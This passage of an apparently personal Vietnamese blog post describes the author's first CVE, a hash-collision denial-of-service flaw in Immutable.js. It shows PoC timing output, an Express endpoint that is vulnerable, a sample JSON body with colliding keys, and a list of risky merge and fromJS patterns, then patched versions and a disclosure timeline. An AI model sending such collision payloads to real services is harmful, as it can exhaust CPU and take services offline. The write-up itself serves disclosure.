Immutable.js hash collision DoS PoC
version: 5.1.6
rounds: 14
key count: 16384
collision hash: 665830272
all generated keys share same hash: true

normal Map build: 40.6 ms
collision Map build: 3617.6 ms
normal Map read all: 7.4 ms
collision Map read all: 2614.5 ms
```

Tức là:

```text
Build Map bình thường: khoảng 40 ms
Build Map collision: hơn 3600 ms
```

Với cùng số lượng key, trường hợp collision chậm hơn khoảng 89 lần.

Phần đọc dữ liệu:

```text
Read bình thường: khoảng 7 ms
Read collision: hơn 2600 ms
```

Chậm hơn khoảng 353 lần.

Con số cụ thể sẽ thay đổi theo máy, nhưng xu hướng thì rất rõ: dữ liệu được attacker "chủ ý sắp xếp" có thể tiêu tốn CPU.

## Impact

Lỗi này ảnh hưởng đến ứng dụng nhận object từ người dùng rồi đưa trực tiếp vào Immutable.js.

Ví dụ:

```js
app.post('/api/import', express.json(), (req, res) => {
  const data = Immutable.fromJS(req.body);
  state = state.mergeDeep(data);
  res.json({ ok: true });
});
```

Trong JSON, attacker không chỉ kiểm soát value. Attacker còn có thể kiểm soát tên key.

Ví dụ request bình thường:

```json
{
  "name": "alice",
  "theme": "dark"
}
```

Request độc hại có thể chứa hàng nghìn key collision:

```json
{
  "AaAaAaAaAaAaAaAaAaAaAaAaAaAa": 1,
  "AaAaAaAaAaAaAaAaAaAaAaAaAaBB": 1,
  "AaAaAaAaAaAaAaAaAaAaAaAaBBAa": 1,
  "AaAaAaAaAaAaAaAaAaAaAaAaBBBB": 1
}
```

Trong thực tế, payload có thể có nhiều key hơn rất nhiều.

Các pattern nguy hiểm:

```js
Immutable.Map(req.body)
Immutable.fromJS(req.body)
state.merge(userObject)
state.mergeDeep(userObject)
```

Nếu chạy trong Node.js, vấn đề càng rõ vì Node.js thường xử lý JavaScript trên event loop. Khi một request giữ CPU quá lâu, các request khác cũng có thể bị ảnh hưởng.

Impact chính:

- CPU tăng cao
- Request timeout
- Event loop bị nghẽn
- Service chậm hoặc mất khả năng phục vụ

## Patch / Mitigation

Chịu, lười viết quá, rảnh mình viết sau, nếu gấp thì cứ update lên:

```text
4.3.9
5.1.8
```

Quan trọng: nếu ứng dụng chỉ dùng key cố định do developer tạo ra, ví dụ:

```js
map.set('username', req.body.username)
```

thì user chỉ kiểm soát value, không kiểm soát key. Trường hợp đó khó bị khai thác bằng lỗi này.

## Timeline

```text
2026-06-05: Report gửi tới maintainer.
2026-06-05: Maintainer confirm/triage.
2026-06-25: Patch được chuẩn bị hoặc merge.
2026-06-26: GitHub Security Advisory `GHSA-xvcm-6775-5m9r` được publish.
2026-07-08: Advisory ghi nhận `CVE-2026-59880`
```

## Reflection

Đây là CVE đầu tiên của mình.

Mình từng nghĩ nếu có CVE đầu tiên, chắc mình sẽ rất là vui. Nhưng đến lúc nó thật sự xảy ra, cảm giác lại khác hơn mình tưởng.

Nhưng nhìn lại, không phải lỗi bảo mật nào cũng cần kỹ thuật trình độ master. Đôi khi nó đến một cách tình cờ, một công thức hash quen thuộc, một bucket collision tuyến tính, và một input do user kiểm soát là đủ để tạo ra một vấn đề.

Cơ mà tại sao lại không vui khi có bug nhỉ, có thể là do 2 tháng gần đây ở nhà nhiều, thất nghiệp, đen tình đen bạc nên mệt mỏi, tới ngày CVE assigned vẫn thấy trống rỗng chăng?

Haizz, cảm ơn Codex không bỏ mình trong những ngày tháng tối tăm, vẫn đồng hành cùng mình viết ra POC này chứ thực sự mình viết code ngu bỏ mẹ.

Ra ngoài chạm cỏ thôi các bạn yêu :))

À trước khi ra ngoài tranh thủ cắm AI agent, rồi đi chơi về nhà claim thành quả thôi. Hai tuần gần đây mình đang nghiện AI, một phần do Codex nó đang free 1 tháng.

## Show Respect
Codex - PoC creater
ChatGPT - Blog editer

## References

- GitHub Security Advisory: [GHSA-xvcm-6775-5m9r](https://github.com/immutable-js/immutable-js/security/advisories/GHSA-xvcm-6775-5m9r)
- CVE: `CVE-2026-59880`
- Immutable.js docs: [https://immutable-js.com/](https://immutable-js.com/)
- CWE-400: Uncontrolled Resource Consumption
- CWE-407: Inefficient Algorithmic Complexity
- OWASP API4: Unrestricted Resource Consumption
